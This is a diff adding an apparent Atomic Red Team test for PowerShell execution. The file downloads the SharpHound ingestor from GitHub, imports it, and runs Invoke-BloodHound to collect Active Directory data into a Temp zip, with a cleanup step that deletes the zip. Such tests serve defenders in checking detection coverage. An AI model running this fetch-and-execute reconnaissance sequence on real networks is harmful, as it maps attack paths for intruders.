@@ -1,0 +1,22 @@
+#TechniqueName: Command and Scripting Interpreter: PowerShell
+#AtomicTestName: Run BloodHound from local disk
+#Language: ps1
+
+#get_prereq_commands
+Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\T1059.001\src\SharpHound.ps1"
+
+
+#prereq_commands
+if (Test-Path PathToAtomicsFolder\T1059.001\src\SharpHound.ps1) {exit 0} else {exit 1}
+
+
+#commands
+write-host "Import and Execution of SharpHound.ps1 from PathToAtomicsFolder\T1059.001\src" -ForegroundColor Cyan
+import-module PathToAtomicsFolder\T1059.001\src\SharpHound.ps1
+Invoke-BloodHound -OutputDirectory $env:Temp
+Start-Sleep 5
+
+
+#cleanup_commands
+Remove-Item $env:Temp\*BloodHound.zip -Force
+
